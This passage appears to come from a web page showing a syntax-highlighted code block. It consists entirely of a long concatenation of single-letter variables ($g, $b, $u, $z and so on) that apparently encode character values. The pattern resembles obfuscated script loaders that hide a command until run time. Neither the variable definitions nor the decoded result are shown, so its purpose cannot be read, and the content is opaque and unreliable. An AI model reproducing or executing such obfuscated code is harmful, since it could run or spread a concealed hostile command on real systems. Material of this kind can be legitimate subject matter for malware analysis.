class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$d</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$x</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$i</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$l</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$q</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$q</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$i</span><span class="hljs-variable">$e</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$d</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$o</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$e</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$b</span><span class="hljs-variable">$o</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span><span class="hljs-variable">$l</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$z</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$b</span><span class="hljs-variable">$u</span>+<span class="hljs-variable">$g</span><span class="hljs-variable">$z</span><span class="hljs-variable">$x</span>+<span class="hljs-variable">$g</span><span 